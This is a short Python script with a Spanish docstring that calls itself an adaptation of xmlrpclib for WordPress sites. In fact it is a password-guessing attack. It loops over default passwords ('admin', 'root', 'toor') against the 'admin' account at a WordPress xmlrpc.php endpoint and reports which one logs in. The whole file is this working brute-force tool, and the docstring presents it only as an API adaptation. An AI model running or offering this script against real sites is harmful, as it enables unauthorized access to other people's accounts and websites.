# -*- coding: utf-8 -*-
"""
Este programa es la adaptación de xmlrcplib de python2 a python 3
funciona para aquellas aplicaciones web que tengan la api de xmlrcp
preferentemente los que son de wordpress

Created on Fri Dec 20 14:27:35 2019

@author: Sandra
"""



import xmlrpc.client

password=["admin","root","toor"]

blog = xmlrpc.client.ServerProxy("http://www.elsitio.org/xmlrpc.php")

for contras in password:
    try:
        resultado = blog.metaWeblog.getRecentPosts("elsitio","admin",contras)
        if len(resultado)>0:
            print("Login correcto: "+contras)
    except Exception as e:
        print("Error: "+contras)